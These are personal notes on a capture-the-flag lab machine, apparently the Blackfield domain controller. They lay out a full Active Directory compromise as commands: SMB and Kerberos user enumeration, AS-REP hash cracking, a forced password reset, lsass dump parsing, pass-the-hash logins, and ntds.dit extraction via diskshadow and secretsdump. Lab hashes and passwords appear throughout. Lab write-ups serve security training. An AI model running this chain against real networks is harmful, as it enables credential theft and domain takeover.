- It's a Domain controller DC01
- nothing super obvious. Goingg to try to access smb
```
smbclient -N ////10.10.10.192/sysvol
```
- got in with smbclient
```
smbclient //10.10.10.192/profiles$
```
- This will be my list for kerberoasting
- getting the list with copy and paste and there are two options to only get the names for the list  
```
awk '{print $1}' usernames.txt > kerberoast.txt
```
```
cut -d ' ' -f1 usernames.txt > kerberoast.txt
```
- validating usernames with kerbrute
```
/opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d blackfield.local --dc 10.10.10.192 kerberoast.txt
```
- Got a hash for support@blackfield.local
```
$krb5asrep$18$support@BLACKFIELD.LOCAL:02d71544d6e4176cd45a8b4a8c47331a$fbaff1ec7b2d01063739ceea884257607f3b835f7bdb40308427332bd96fe60b79c61aa44ccbb30f27aa278b36945914ee53e658fe391768c49b437c3000affb64020d39992bc5a3d5d6e560787bd57209e8c7242683a07eb1e8c40eae3335e97e270f84229057a6b95b45415acc1985af2a29e845232ccb2f5c14246995b278a61069318ea7344b59c480f14a883c3c851ec6ad8cac64d238c39fcba1812794fc5b502bfd47f6eaf9c203a661c24ce45aff43a739897ceae3406fc7ffde067525cece5a489b3c13aca9cd03fdb74667eeb3d5de526aff21f2580a74b5bd5ab3640ee323203bf1b10008a994f4f10200a79b87e418306a19ca9d0479039e2b33578ea1e02c406dbb
```
- Also got other usernames but support has no pre auth required
- Cracking with 
```
hashcat -m 18200 support_hash.txt -o cracked.txt /usr/share/wordlists/rockyou.txt --force 
```
- Password is BlackKnight
- going to try winrm with creds
- no luck. Trying smb
- looked up a cheat.  trying bloodhound-python was out of ideas
```
bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192 --zip -op support
```
- Got the file
- running in bloodhound
- Outbound control over audit2020@blackfield.local so we could potentially change the password and login as audit
- Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.
```
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```
- Didn't work
- looked up a cheat
- rpc
```
command actually worked but the password wasn't complicated enough so I changed it to newP@ssword2022
```
```
net rpc password "audit2020" "newP@ssword2022" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "dc01.blackfield.local" 
```
- Got into the forensic share 
```
smbclient -U audit2020 \\\\blackfield.local\\forensic
```
- Now trying the Impacket execs with audit2020
- None worked. Shares were not writable. trying winrm as audit2020
- no luck
- got another hash for support
- no luck with the crack also blackknight password is not bieng reused
- found lsass.zip on the smb share and unzipped it to get a lsass dump file. going to analyze with volatility
- volatility didn't work 
- secret is to use pypykatz
```
pypykatz lsa minidump lsass.DMP -k kerberos_tickets -o credentials.txt
```
- Got NT hashes with 
```
cat credentials.txt | grep -C 5 NT
```
- Evil winrm for the win
```
evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
```
- Got user
- moving to winpeas
- Can't run winPEAS
- Trying Sharphound
- user has backup privileges so going to leverage a script priv.dsh in resources to expose the C: drive to the Z: drive and execute with diskshadow 
```
then unix2dos priv.dsh before upload
```
```
diskshadow /s priv.dsh
```
- Copy ntds.dit 
```
robocopy /b Z:\windows\ntds . ntds.dit
```
- Get registry hive too 
```
reg save hklm\system C:\temp\system
```
- On local machine ran this to get hashes from ntds.dit with the SYSTEM hive
```
impacket-secretsdump -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```
- Used the NT hash from ntlm-extract.ntds to get in with evil-winrm ad admin
```
evil-winrm -u Administrator -H "184fb5e5178480be64824d4cd53b99ee" -i 10.10.10.192 
```
- got root
- 
